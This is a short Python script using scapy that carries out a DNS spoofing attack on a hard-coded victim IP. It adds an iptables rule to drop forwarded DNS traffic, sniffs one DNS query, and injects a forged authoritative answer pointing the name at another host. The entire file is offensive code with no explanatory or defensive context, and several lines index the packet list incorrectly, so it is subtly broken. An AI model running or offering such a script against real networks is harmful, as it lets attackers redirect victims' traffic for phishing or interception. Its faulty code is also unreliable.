from scapy.all import sniff, DNS, DNSQR, DNSRR, srp, IP, Ether, sendp, UDP
from subprocess import Popen, PIPE

victimIP = "10.5.1.2"
gotoIP = "10.5.1.3"

firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
Popen([firewall], shell=True, stdout=PIPE)


a=sniff(count=1, filter="udp and port 53 and host " + victimIP, promisc=1)
if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
    spoof = ((Ether())/IP(dst=a[IP].src, src=a[IP].dst)/UDP(dport=a[UDP].sport, sport=a[UDP].dport)/DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=a[DNS].qd.qname, ttl=10, rdata=gotoIP)))
    sendp(spoof, count=1)
    


    



